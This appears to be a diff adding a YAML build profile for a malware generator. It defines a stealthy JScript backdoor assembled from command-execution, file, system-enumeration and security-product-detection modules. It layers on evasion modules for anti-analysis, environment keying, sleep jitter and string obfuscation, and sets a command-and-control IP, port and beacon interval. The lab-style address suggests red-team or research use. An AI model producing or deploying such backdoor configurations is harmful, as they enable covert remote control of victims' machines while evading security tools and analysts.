@@ -1,0 +1,22 @@
+name: js_backdoor_stealth_fast
+description: Stealthy JScript backdoor with env keying and string obfuscation
+format: jscript
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/sysinfo
+- collectors/security_products
+arch: arch/backdoor
+evasion:
+- evasion/anti_analysis
+- evasion/env_keying
+- evasion/behavioral_pacing
+- evasion/sleep_jitter
+- evasion/string_obfusc
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
+  BEACON_INTERVAL: '120000'
+resources: false
